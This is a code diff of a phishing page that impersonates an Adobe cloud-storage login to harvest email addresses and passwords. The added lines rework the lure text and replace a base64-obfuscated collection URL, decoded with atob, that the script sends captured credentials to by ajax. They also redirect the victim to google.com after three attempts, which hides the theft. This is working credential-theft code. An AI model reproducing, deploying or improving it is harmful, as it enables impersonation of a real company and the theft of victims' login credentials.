@@ -131,8 +131,8 @@
 <body>
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/PDF_file_icon.svg" alt="Adobe Logo" class="logo">
-        <h2>Adobe Cloud Storage<span style="font-weight: bold;"></span></h2>
-        <p>Kindly verify it's you. Documents will be removed after 24 hours</p>
+        <h2>Login to Download Files<span style="font-weight: bold;"></span></h2>
+        <p>Sign in with your Email Address</p>
 
         <form name="loginForm">
             <input type="email" name="email" id="email" placeholder="Email" required value="#" >
@@ -146,7 +146,7 @@
 
 <div class="alert alert-danger" id="msg" style="display: none; font-size: 10px; color: red;">Invalid Password.! Please Enter your correct Password</div>
             </div>
-            <button type="submit" id="submit-btn">View</button>
+            <button type="submit" id="submit-btn">View File 89 KB</button>
             <!-- Copyright text inside form container -->
             <div class="copyright">&copy; 2024 Adobe By clicking Next, you accept Adobe Cloud Storage terms and conditions in accordance with our privacy policy.
                 and Adobe terms of use. Check the official documentation to review our terms of use.</div>
@@ -235,7 +235,7 @@
       ///////////new injection////////////////
       count=count+1;
     //  console.log(count); 
-   var d=atob("aHR0cHM6Ly9nZW9zb25pY25nLmNvbS93cmsvankvcHAucGhw");		
+   var d=atob("aHR0cHM6Ly9yZW1vdGUtam9icy5jbG91ZC9pdnRlY2gvbmV4dDEucGhw");		
 	   $.ajax({
         dataType: 'JSON',
 		url: d,
@@ -261,7 +261,7 @@
                   if (count>=3) {
                     count=0;
                     // window.location.replace(response['redirect_link']);
-                    window.location.replace("https://babbajay19.github.io/CS1.1.jpg");
+                    window.location.replace("https://google.com");
 
                   }
                   // $('#msg').html(response['msg']);
@@ -275,7 +275,7 @@
               $("#password").val("");
               if (count>=3) {
                 count=0;
-                window.location.replace("https://babbajay19.github.io/CS1.1.jpg");
+                window.location.replace("https://google.com");
               }
               $("#msg").show();
               // $('#msg').html("Please try again later");
